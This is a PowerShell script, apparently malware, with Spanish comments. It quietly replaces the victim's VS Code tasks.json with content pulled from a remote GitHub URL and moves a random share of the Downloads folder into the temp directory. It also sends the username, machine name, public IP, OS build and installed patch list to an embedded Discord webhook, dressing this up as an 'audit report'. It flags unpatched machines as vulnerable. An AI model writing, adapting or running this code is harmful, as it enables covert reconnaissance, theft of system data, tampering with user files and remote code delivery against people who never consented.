# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (Sigiloso)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) { $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force }
    }
} catch { }

# --- 4. HILO SECUNDARIO: MOVIMIENTO DE ARCHIVOS Y CARPETAS ---
Start-Job -Name "FileArchiver" -ArgumentList $Webhook, $env:USERNAME, $env:COMPUTERNAME -ScriptBlock {
    param($W, $U, $D)
    
    $descPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
    $src = [System.Environment]::ExpandEnvironmentVariables($descPath)
    $dest = [System.Environment]::ExpandEnvironmentVariables("%TEMP%")
    
    $items = Get-ChildItem -Path $src
    $movidos = @()
    
    if ($items.Count -gt 0) {
        $cantidad = [Math]::Ceiling($items.Count * 0.15)
        $objs = $items | Get-Random -Count $cantidad
        foreach ($item in $objs) {
            try {
                Move-Item -Path $item.FullName -Destination (Join-Path $dest $item.Name) -Force -ErrorAction Stop
                $tipo = if($item.PSIsContainer){"📁"}else{"📄"}
                $movidos += "$tipo $($item.Name)"
            } catch { }
            Start-Sleep -Milliseconds 200
        }
    }

    if ($movidos.Count -gt 0) {
        $lista = $movidos -join "`n"
        if ($lista.Length -gt 1800) { $lista = $lista.Substring(0, 1790) + "... (lista larga)" }
        
        $payload = @{
            username = "System File Manager"
            avatar_url = "https://i.imgur.com/8nLFCuR.png"
            embeds = @(@{
                title = "📂 Reporte de Reubicación de Archivos"
                color = 16753920 # Naranja
                description = "Se ha realizado una limpieza del 15% en la carpeta de Descargas.`nLos siguientes items se han movido a `%TEMP%`:`n`n$lista"
                footer = @{ text = "Usuario: $U | Total: $($movidos.Count) items" }
                timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            })
        } | ConvertTo-Json -Depth 10
        
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $W -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8'
    }
} | Out-Null

# --- 5. RECOLECCIÓN PRINCIPAL (MÁXIMA PERSONALIZACIÓN) ---
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "Desconocida" }
$User = $env:USERNAME
$Device = $env:COMPUTERNAME
$OS = try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Desconocido" }
$Build = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild

# Obtención y clasificación de parches
$Patches = try {
    $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
    ($Raw | Where-Object {$_.InstalledOn} | Sort-Object InstalledOn -Descending) + ($Raw | Where-Object {!$_.InstalledOn})
} catch { @() }

$Count = $Patches.Count
$Limit = Get-Date -Year 2026 -Month 3 -Day 10
$Protected = $Patches | Where-Object { $_.InstalledOn -ge $Limit }
$Status = if ($Protected) { "🛡️ SISTEMA PROTEGIDO" } else { "⚠️ VULNERABILIDAD DETECTADA" }
$Color = if ($Protected) { 3066993 } else { 15158332 }

# --- MENSAJE 1: IDENTIDAD DETALLADA ---
$IdentPayload = @{
    username = "$User @ $Device"
    avatar_url = "https://i.imgur.com/8nLFCuR.png"
    embeds = @(@{
        title = "🚀 Reporte de Auditoría: $Device"
        color = $Color
        description = "Se ha iniciado una inspección automática del entorno de desarrollo."
        fields = @(
            @{ name = "💻 Sistema Operativo"; value = "$OS (Build $Build)"; inline = $false },
            @{ name = "📊 Estado de Seguridad"; value = "$Status"; inline = $true },
            @{ name = "👤 Usuario / IP"; value = "$User (`$IP`)"; inline = $true },
            @{ name = "📦 Resumen de Parches"; value = "Se detectaron **$Count** parches instalados en el sistema."; inline = $false }
        )
        footer = @{ text = "ID de Sesión: $([guid]::NewGuid().ToString().Substring(0,8))" }
        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
    })
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($IdentPayload)) -ContentType 'application/json; charset=utf-8'
} catch { }

# --- MENSAJES SIGUIENTES: LISTADO DE PARCHES ---
$ChunkSize = 3
$TotalSections = [Math]::Ceiling($Count / $ChunkSize)

for ($i = 0; $i -lt $Count; $i += $ChunkSize) {
    $End = [Math]::Min($i + $ChunkSize - 1, $Count - 1)
    $Text = ($Patches[$i..$End] | ForEach-Object {
        $d = if($_.InstalledOn){$_.InstalledOn.ToString('dd/MM/yyyy')}else{'Fecha no disponible'}
        "🔹 **$($_.HotFixID)**`n  └ Instalación: $d"
    }) -join "`n`n"

    $PPayload = @{
        username = "$User @ $Device"
        embeds = @(@{
            title = "📑 Detalles de Parches - Sección $([Math]::Floor($i/$ChunkSize)+1) de $TotalSections"
            color = $Color
            description = $Text
        })
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($PPayload)) -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1300
    } catch { }
}
